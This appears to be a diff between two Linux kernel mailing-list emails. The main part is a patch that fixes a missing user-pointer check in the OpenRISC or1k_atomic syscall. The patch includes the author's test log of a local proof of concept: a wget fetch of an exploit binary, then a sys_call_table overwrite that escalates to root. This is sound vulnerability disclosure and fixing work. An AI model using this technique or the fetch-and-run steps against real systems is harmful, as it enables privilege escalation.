@@ -1,152 +1,215 @@
-Received: from mail-yx1-f48.google.com (mail-yx1-f48.google.com [74.125.224.48])
-	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
+Received: from sender-of-o57.zoho.eu (sender-of-o57.zoho.eu [136.143.169.57])
+	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 9DA03352029
-	for <stable@vger.kernel.org>; Fri, 21 Aug 2026 01:45:15 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=pass smtp.client-ip=74.125.224.48
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id EA57ECA6F;
+	Fri, 21 Aug 2026 01:46:15 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=pass smtp.client-ip=136.143.169.57
 ARC-Seal:i=2; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1787276717; cv=pass; b=Pvgc4MCfLsWevYIPeoeOCEc7Zgs/G2QPjJsxEpspBN/yHg2KUQ0EsWxUzKRATX7eEb5bIAUtdK6TOh2OywVDXMkwHROQm0s2F8UT0a/zwAPRz3Hp67BBPoM6SNoQMQuHRQPpF1xNX7ivDdd1L8heuwO0SyNVTbn3b+gsqt4eqbg=
+	t=1787276778; cv=pass; b=CGe+zjswhbPNMFwy1257B3ZUwPVsWbl9033Q8/otukQnoIL3dt0662ooLMAhe21v0ljSQJ78JXsMw6QEYlSBHrB42uhDVTXkx4ygP7EV24b1vdDPiw88pkVpNEmF2/oFrE2b8NeUvq2sw5NQ06U43BPHTXig7MXaplp9kkmNBIE=
 ARC-Message-Signature:i=2; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1787276717; c=relaxed/simple;
-	bh=GalG5KeewwDo5F/yvEnnWSTdgiJ/XKsm/a64IaDoohc=;
-	h=MIME-Version:References:In-Reply-To:From:Date:Message-ID:Subject:
-	 To:Cc:Content-Type; b=GpxI6WnIt+H1qgOJwpMszX2hh3thMhKYiAAb48FfGYWZIdLyKVyqtY6iKx2NKQYPDjt8f8nzYNP5aZ45A5nSUa9bVkb8V5ellT/4rYHxu457x37JUSeamZlvTITJppuPkk2SuVjziJKfzOFkzRinBEGs6+Sz4yZJ42YiHpRycWg=
-ARC-Authentication-Results:i=2; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=DDvpS6AY; arc=pass smtp.client-ip=74.125.224.48
-Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
-Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
+	s=arc-20240116; t=1787276778; c=relaxed/simple;
+	bh=HPPwkKcjUgrSNj9kyyEM8ZYJX/2geHZhH62K0zQO8XM=;
+	h=From:To:Cc:Subject:Date:Message-ID:In-Reply-To:References:
+	 MIME-Version; b=Lypl3KvXFzJ+fY1XHyfkJdiIWTgf8dGi45S0Jx0Eip4Q1ZgmBoRzyomN6Es4cLUY2ZCTZnjapyIgYd2f8eDErPgiQguEoIHD4c3xk0PaLIW5euNd1fpm1dKJvzhgOCL6SDXKkevLSosTt0wHOGxR129F2d4iYILi3i7v/+2r5aQ=
+ARC-Authentication-Results:i=2; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=iusegentoo.com; spf=pass smtp.mailfrom=iusegentoo.com; dkim=pass (1024-bit key) header.d=iusegentoo.com header.i=ali@iusegentoo.com header.b=Zi6RnThD; arc=pass smtp.client-ip=136.143.169.57
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=iusegentoo.com
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=iusegentoo.com
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="DDvpS6AY"
-Received: by mail-yx1-f48.google.com with SMTP id 956f58d0204a3-66c70d73210so582743d50.0
-        for <stable@vger.kernel.org>; Thu, 20 Aug 2026 18:45:15 -0700 (PDT)
-ARC-Seal: i=1; a=rsa-sha256; t=1787276714; cv=none;
-        d=google.com; s=arc-20260327;
-        b=eErIhYO9mbWa2YmT1DilSDYjmtVhpcuFlyd5ugQAdZsocFvd//kKXHiFbAF13cRq8d
-         ezeOzSwCAhVePD7HK4b+If6ynk56jn/Yj+33SmrSkFEBGykuMdlsoCneELIRoIrIsiPX
-         kiD7E6BTxWacFu81ih17ugUH8YwGA4hJXoIuk9LzZAq0Rh7uyGlqYqYDRp9nWPqi4JGx
-         YhdqmbiPewvS+r2AQphQEiFS2aTe3vkKm2B48iyU1n5UuwoOHloany8qhC0GyLKiKv+c
-         /qKkznO8wH7yQSXjNeDwXQF27Y5OkM8TmvLztXvs1VYzyjU7zoTzQ9Wab8PVmusjMRVw
-         j77g==
-ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20260327;
-        h=content-transfer-encoding:cc:to:subject:message-id:date:from
-         :in-reply-to:references:mime-version:dkim-signature;
-        bh=ie2zZl8YsHAeQXHgNP1pjeAs7NQ+FFglXIo7DLINxR8=;
-        fh=SiOGIuEav5nD6gszWFaWgnTu2cu/hmCdubXQm8XLTSA=;
-        b=bkfomhY+s+Xa5sehC7A85+XCg8ZCqWZ6Su9qqQmD8BhiEv9qsWC1zw9jVweR6udxeO
-         Adi/wvX/14vbfKc3WePkBdw7ALUJXu6AAKDBycCntIB/t2DvKGBALGWMo7A9Qc0eXF90
-         cZ4hITMd/Qo7HyrS2CxFcWbCB7+Qimm2Dl0ie/CpYtVhpbjwOBOzqCb5MWeh7n39bQDF
-         FLvOHSiteLgbV+Aws7nqHewWPNS72yQn/jykTavRyJKBryOn9bcyVUKscG9D0p+A4ofV
-         rQ9azyswTwwon9r1DZZah3pl+lCW2EUhi1CngI4tlwuI4XTR4+nVRO2SNQRIdAF3e0eS
-         ZKPg==;
-        darn=vger.kernel.org
-ARC-Authentication-Results: i=1; mx.google.com; arc=none
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=gmail.com; s=20251104; t=1787276714; x=1787881514; darn=vger.kernel.org;
-        h=content-transfer-encoding:content-type:cc:to:subject:message-id
-         :date:from:in-reply-to:references:mime-version:from:to:cc:subject
-         :date:message-id:reply-to:content-type;
-        bh=ie2zZl8YsHAeQXHgNP1pjeAs7NQ+FFglXIo7DLINxR8=;
-        b=DDvpS6AYoxwjfQbd68vh3RBexhASsJezUyeqhYO5LD7/IbyNTT2eEiRMt2mYVPEmL+
-         K96IeHJLXoMxhTyL7dSNoPpBfs5skoVabKmMBBoXEoRuA7IYvuN+M8NQS+MDiajUpRTx
-         kAZyudxViONPr8iE0Bs4LiYMA75CnNOcRN+xfhTLqu3+7+W6yYwcosJPiGTyN3D/kjOf
-         CQOp9ilduqYHtjbwXjmJ27hHjLeRo49g9QUQEck72ekbes3oaFeyTEqF9bR0J3i4Dlcx
-         yVd2/lsPR5n533oemKwcHDvBN1ncU34eY2NRkg89CDjY/l+PBry3auJygd+2hMO/Vz+p
-         RzSw==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20251104; t=1787276714; x=1787881514;
-        h=content-transfer-encoding:content-type:cc:to:subject:message-id
-         :date:from:in-reply-to:references:mime-version:x-gm-gg
-         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to
-         :content-type;
-        bh=ie2zZl8YsHAeQXHgNP1pjeAs7NQ+FFglXIo7DLINxR8=;
-        b=qifR/tpJioBR/ObG5mCKp+EDMviRzPBhyK0Qbx2pwN4N01UPozMuFwQHnv5PonBdfk
-         GXCiGaQsOqPJIRDAdLZgzvWfi8rRk3iHYf++L7QRKbl1kEOO8WPPGDH4YU8C1/SngJhC
-         P+/FhPbWCjr5CTt6lRWtTuE9ZbLR/O8oMCfgmGA/dpriL4piLhUROLledmui0p/+3Tar
-         DmCdYtdw3EQn6wQkT3v2xkISR/QvS0YBU1rhQA4iDd92LO6Q3nhtFZXJYvz3MT4Bcj5x
-         KMnSNtIj3bx5l5zKsskjZOJuVJWAQwfOV3O/N/lwUzCaDxBvsJm4CloHuq75fl9LtoTN
-         7owQ==
-X-Forwarded-Encrypted: i=1; AHgh+Rqm9sefdlyNL2BtZi3VnRiJmJ9r0BLB5TH7CRrmGTJG0wjDJOYpaOTFYCzNqgWiHz0Ti0u2yVk=@vger.kernel.org
-X-Gm-Message-State: AFuF++kALS8TkNCWAJFAOBUaoontKqqMBP998RTdEtHlpPWI7FiDP27D
-	Rf/WFux8NTGRwRvhjaKccKPFckLLQZGkbuYjj/YrCoVGxTKiWzSCTVMnzD7ximh5P+6G2DUkP6J
-	EGRzQkfZYccdt5KixOT2s5qUiW5oSUhI=
-X-Gm-Gg: AR+sD10WwPl8M6F5IGRYigqUGCW6znGTV8IrkFBqssVHIL56sgy+eHW/zJafyQvq46J
-	6K0alP34nqgAbX4Hwv64hPBaMsb1BGCqQQA4o77ifE+C1PEsoXh4bpgmHNuOO1XM1JGtnaa5A74
-	1g1GUkZBwPl/b6yli+YPZbbtggulO5RT7CaqNyzc4fMx5czMCHQPUtrENGut1fSd6ghPolV0iFa
-	8qCKiypERmpfOMqrZw2EsQQYyd5ulifmfztuaGEEeO1mnGSLNdtjKWl4q/bkx+OJp747KvDJZwK
-	P66lcSVf4qkSBuAHQGjYkI+9PxeO+XYyWbHYNMc4KtJJJMDphFk7Rz5k+XjH4nimZ6idK+ZDxQ5
-	Ge1QdxDee4XpQNVZEV+nLkk+jOMrvphzDbw==
-X-Received: by 2002:a53:c052:0:20b0:66c:c998:f9d3 with SMTP id
- 956f58d0204a3-66ce49a273cmr1032714d50.5.1787276714075; Thu, 20 Aug 2026
- 18:45:14 -0700 (PDT)
+	dkim=pass (1024-bit key) header.d=iusegentoo.com header.i=ali@iusegentoo.com header.b="Zi6RnThD"
+ARC-Seal: i=1; a=rsa-sha256; t=1787276757; cv=none; 
+	d=zohomail.eu; s=zohoarc; 
+	b=TKoVoXw/aLwragSNt2eAGpxKyfpZPzr5zVW1yVfz6MJrlJ/Kj9Iq2M35G8qB0Aru9+d2Lrv/ODKafCW6a/v4n7lOxlGVvrNFYD0AU08PbHWKAZ7PBD9oRzxxDH3XCks8y7jfsuRTZdChi0vQs3BI984aOTqMhHVi7vJDObI49KI=
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=zohomail.eu; s=zohoarc; 
+	t=1787276757; h=Content-Transfer-Encoding:Cc:Cc:Date:Date:From:From:In-Reply-To:MIME-Version:Message-ID:Subject:Subject:To:To:Message-Id:Reply-To; 
+	bh=ISjUucAVGoT5z0VJ4jKHqh34wudxS0La4GKCHAN0u8k=; 
+	b=DCoqwdVN/dRbBb8Bs7qS0M9P01avyujHubnNXxqWZh7dJ3ma3V8OySU1zXDaJ0VDXdMUTMf/yIiHxNRNRHd8jRWOHOsms7Y1lgwqXQcvGY5SDXAnAF6Zu9AdHywPvZbsRZ1/BYEN4cq3O+e+8xIAr7xNwECKfW3PUVvGdtfdFjY=
+ARC-Authentication-Results: i=1; mx.zohomail.eu;
+	dkim=pass  header.i=iusegentoo.com;
+	spf=pass  smtp.mailfrom=ali@iusegentoo.com;
+	dmarc=pass header.from=<ali@iusegentoo.com>
+DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; t=1787276756;
+	s=zmail; d=iusegentoo.com; i=ali@iusegentoo.com;
+	h=From:From:To:To:Cc:Cc:Subject:Subject:Date:Date:Message-ID:In-Reply-To:MIME-Version:Content-Transfer-Encoding:Message-Id:Reply-To;
+	bh=ISjUucAVGoT5z0VJ4jKHqh34wudxS0La4GKCHAN0u8k=;
+	b=Zi6RnThD9iRQN+2pFHo73sBEZTTdSZ9MugLRqoMxoJ0bUrdUGVoFBgkHfNTNzB6g
+	lzIKnZGZVO8ZNH7+2qQurvHejPR8KFkGtuj6+LrOtlTT2BnWy3hpld2ox+eG7THQrpD
+	WK8bwPnVBw6IVIwrFstIbR5D/dTAUlN10IxuMCt8=
+Received: by mx.zoho.eu with SMTPS id 1787276753606332.997101807955;
+	Fri, 21 Aug 2026 03:45:53 +0200 (CEST)
+From: Ali Ahmet Memis <ali@iusegentoo.com>
+To: Jonas Bonn <jonas@southpole.se>,
+	Stefan Kristiansson <stefan.kristiansson@saunalahti.fi>,
+	Stafford Horne <shorne@gmail.com>
+Cc: Arnd Bergmann <arnd@arndb.de>,
+	linux-openrisc@vger.kernel.org,
+	linux-kernel@vger.kernel.org,
+	stable@vger.kernel.org
+Subject: [PATCH v2] openrisc: fix arbitrary kernel memory access via or1k_atomic syscall
+Date: Fri, 21 Aug 2026 01:45:27 +0000
+Message-ID: <20260821014543.588228-1-ali@iusegentoo.com>
+X-Mailer: git-send-email 2.55.0
+In-Reply-To: <20260821013839.587041-1-ali@iusegentoo.com>
+References: <20260821013839.587041-1-ali@iusegentoo.com>
 Precedence: bulk
 X-Mailing-List: stable@vger.kernel.org
 List-Id: <stable.vger.kernel.org>
 List-Subscribe: <mailto:stable+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:stable+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
-References: <20260813064902.367504-1-kartikey406@gmail.com>
-In-Reply-To: <20260813064902.367504-1-kartikey406@gmail.com>
-From: Deepanshu Kartikey <kartikey406@gmail.com>
-Date: Fri, 21 Aug 2026 07:15:01 +0530
-X-Gm-Features: AcwNN1V4dmKKGjPji2yVJLBTkyyZSgMh7TnOyiEqwl6nQbzA8cc22mdo1kQ-CyA
-Message-ID: <CADhLXY6zACn7j=hSfj2jemjV7eFnVeAd4Dk_CVK4OKGu-KPX3g@mail.gmail.com>
-Subject: Re: [PATCH v2] drm/i915: Guard against NULL driver_data in i915_pci_probe()
-To: jani.nikula@linux.intel.com, joonas.lahtinen@linux.intel.com, 
-	rodrigo.vivi@intel.com, tursulin@ursulin.net, airlied@gmail.com, 
-	simona@ffwll.ch, krzysztof.karas@intel.com
-Cc: intel-gfx@lists.freedesktop.org, dri-devel@lists.freedesktop.org, 
-	linux-kernel@vger.kernel.org, 
-	syzbot+db96c5ff032f4292a8dc@syzkaller.appspotmail.com, stable@vger.kernel.org
-Content-Type: text/plain; charset="UTF-8"
-Content-Transfer-Encoding: quoted-printable
+Content-Transfer-Encoding: 8bit
+X-ZohoMailClient: External
 
-On Thu, Aug 13, 2026 at 12:19=E2=80=AFPM Deepanshu Kartikey
-<kartikey406@gmail.com> wrote:
->
-> pci_match_device() can return the dummy pci_device_id_any entry
-> when a device is force-bound via sysfs driver_override, in which
-> case ->driver_data is unset (NULL). i915_pci_probe() casts it to
-> struct intel_device_info * unconditionally and dereferences
-> intel_info->require_force_probe, causing a NULL-ptr-deref.
->
-> Reported-by: syzbot+db96c5ff032f4292a8dc@syzkaller.appspotmail.com
-> Closes: https://syzkaller.appspot.com/bug?extid=3Ddb96c5ff032f4292a8dc
-> Tested-by: syzbot+db96c5ff032f4292a8dc@syzkaller.appspotmail.com
-> Cc: stable@vger.kernel.org
-> Signed-off-by: Deepanshu Kartikey <kartikey406@gmail.com>
-> ---
-> v2: Drop Fixes tag, this isn't a regression from a single commit -
->     the unconditional dereference of ->driver_data has always assumed
->     it points into a MODULE_DEVICE_TABLE()-backed entry, an assumption
->     broken by the generic driver_override fallback path, not by any
->     i915-specific change. Add Cc: stable instead. (Krzysztof, Jani)
-> ---
->  drivers/gpu/drm/i915/i915_pci.c | 3 +++
->  1 file changed, 3 insertions(+)
->
-> diff --git a/drivers/gpu/drm/i915/i915_pci.c b/drivers/gpu/drm/i915/i915_=
-pci.c
-> index 82415af47d54..2f03f95945f1 100644
-> --- a/drivers/gpu/drm/i915/i915_pci.c
-> +++ b/drivers/gpu/drm/i915/i915_pci.c
-> @@ -958,6 +958,9 @@ static int i915_pci_probe(struct pci_dev *pdev, const=
- struct pci_device_id *ent)
->                 (struct intel_device_info *) ent->driver_data;
->         int err;
->
-> +       if (!intel_info)
-> +               return -ENODEV;
-> +
->         if (intel_info->require_force_probe && !id_forced(pdev->device)) =
-{
->                 dev_info(&pdev->dev,
->                          "Your graphics device %04x is not properly suppo=
-rted by i915 in this\n"
-> --
-> 2.43.0
->
+sys_or1k_atomic() (syscall 244 in the "or1k" ABI) takes two user
+pointers, v1 and v2, and swaps the words they point to in hand-written
+assembly.
 
-Gente Reminder. Let me know the status of this patch .
+    l.lwz   r29,0(r4)
+    l.lwz   r27,0(r5)
+    l.sw    0(r4),r27
+    l.sw    0(r5),r29
 
-Thanks
+The pointers are not checked with access_ok(). The four memory
+accesses also have no exception table entries.
 
-Deepanshu
+A caller passes a kernel address as either pointer, and the syscall
+reads from and writes to it directly.
+
+This gives an unprivileged process a kernel read/write primitive. It
+overwrites kernel data such as the sys_call_table, gaining code
+execution in kernel context.
+
+Check both pointers before entering the critical section. Add fixups
+for the four memory accesses so faults on valid but unmapped user
+addresses return -EFAULT.
+
+Fixes: 9d02a4283e9c ("OpenRISC: Boot code")
+Cc: stable@vger.kernel.org
+Signed-off-by: Ali Ahmet Memis <ali@iusegentoo.com>
+---
+v2: add Cc: stable@vger.kernel.org, missed in v1.
+
+Tested against an unpatched or1ksim build with a local PoC that uses
+this syscall to overwrite a sys_call_table entry and escalate to root:
+
+ali@archlinux:~$ cd ~/or1k-build/buildroot/output/images
+ali@archlinux:~/or1k-build/buildroot/output/images$ qemu-system-or1k -kernel vmlinux -nographic -append "console=ttyS0"
+FDT at (ptrval)
+Linux version 6.18.7 (ali@archlinux) (or1k-buildroot-linux-musl-gcc.br_real (Buildroot -g86102dd8) 15.3.0, GNU ld (GNU Binutils) 2.45.1) #5 Fri Aug 21 00:38:10 UTC 2026
+OF: reserved mem: Reserved memory: No reserved-memory node in the DT
+CPU: OpenRISC-13 (revision 8) @20 MHz
+-- dmmu:  128 entries, 1 way(s)
+-- immu:  128 entries, 1 way(s)
+-- additional features:
+-- power management
+-- PIC
+-- timer
+Initial ramdisk not found
+Setting up paging and PTEs.
+map_ram: Memory: 0x0-0x8000000
+Zone ranges:
+  Normal   [mem 0x0000000000000000-0x0000000007ffffff]
+Movable zone start for each node
+Early memory node ranges
+  node   0: [mem 0x0000000000000000-0x0000000007ffffff]
+Initmem setup node 0 [mem 0x0000000000000000-0x0000000007ffffff]
+itlb_miss_handler (ptrval)
+dtlb_miss_handler (ptrval)
+OpenRISC Linux -- http://openrisc.io
+Kernel command line: console=ttyS0
+printk: log buffer data + meta data: 131072 + 409600 = 540672 bytes
+Dentry cache hash table entries: 16384 (order: 3, 65536 bytes, linear)
+Inode-cache hash table entries: 8192 (order: 2, 32768 bytes, linear)
+Sorting __ex_table...
+Built 1 zonelists, mobility grouping on.  Total pages: 16384
+mem auto-init: stack:all(zero), heap alloc:off, heap free:off
+mem_init_done ...........................................
+SLUB: HWalign=16, Order=0-3, MinObjects=0, CPUs=1, Nodes=1
+NR_IRQS: 32, nr_irqs: 32, preallocated irqs: 0
+clocksource: openrisc_timer: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 95563022313 ns
+Console: colour dummy device 80x25
+40.00 BogoMIPS (lpj=80000)
+$ id
+uid=1000(test) gid=1000(test) groups=1000(test)
+$ wget -O /tmp/x http://10.0.2.2:8000/lpe_static
+Connecting to 10.0.2.2:8000 (10.0.2.2:8000)
+saving to '/tmp/x'
+x                    100% |********************************|  174k  0:00:00 ETA
+'/tmp/x' saved
+$ chmod +x /tmp/x
+$ /tmp/x
+Initial: uid=1000 euid=1000
+Installing commit_creds into getuid entry
+sys_call_table[174] overwritten
+original handler = 0xc002e2ac
+Calling hijacked syscall with init_cred
+hijacked syscall returned 0
+Restoring original getuid handler
+syscall table restored
+Final identity: uid=0 euid=0
+# id
+uid=0(root) gid=0(root)
+#
+
+ arch/openrisc/kernel/entry.S | 42 ++++++++++++++++++++++++++++++++++++++---
+ 1 file changed, 39 insertions(+), 3 deletions(-)
+
+diff --git a/arch/openrisc/kernel/entry.S b/arch/openrisc/kernel/entry.S
+index c7e90b09645e..2e8c4102cd62 100644
+--- a/arch/openrisc/kernel/entry.S
++++ b/arch/openrisc/kernel/entry.S
+@@ -1223,15 +1223,49 @@ _no_syscall_trace:
+  *
+  */
+
++/* Keep this literal; hi()/lo() can't use the UL-suffixed TASK_SIZE. */
++#define OR1K_ATOMIC_ADDR_LIMIT	0x7ffffffc
++
+ ENTRY(sys_or1k_atomic)
+ 	/* FIXME: This ignores r3 and always does an XCHG */
++
++	/* Check both user pointers before accessing them. */
++	l.movhi	r13,hi(OR1K_ATOMIC_ADDR_LIMIT)
++	l.ori	r13,r13,lo(OR1K_ATOMIC_ADDR_LIMIT)
++	l.sfgtu	r4,r13
++	l.bf	9f
++	 l.nop
++	l.sfgtu	r5,r13
++	l.bf	9f
++	 l.nop
++
+ 	DISABLE_INTERRUPTS(r17,r19)
+-	l.lwz	r29,0(r4)
+-	l.lwz	r27,0(r5)
+-	l.sw	0(r4),r27
+-	l.sw	0(r5),r29
++10:	l.lwz	r29,0(r4)
++11:	l.lwz	r27,0(r5)
++12:	l.sw	0(r4),r27
++13:	l.sw	0(r5),r29
+ 	ENABLE_INTERRUPTS(r17)
+ 	l.jr	r9
+ 	 l.or	r11,r0,r0
+
++	/* Either pointer was outside user space, or turned out to be
++	 * unmapped/inaccessible when we actually touched it.
++	 */
++9:	l.jr	r9
++	 l.addi	r11,r0,-EFAULT
++
++	.section .fixup, "ax"
++14:
++	ENABLE_INTERRUPTS(r17)
++	l.j	9b
++	 l.nop
++	.previous
++
++	.section __ex_table, "a"
++	.long	10b, 14b
++	.long	11b, 14b
++	.long	12b, 14b
++	.long	13b, 14b
++	.previous
++
+ /* ============================================================[ EOF ]=== */
+--
+2.51.0
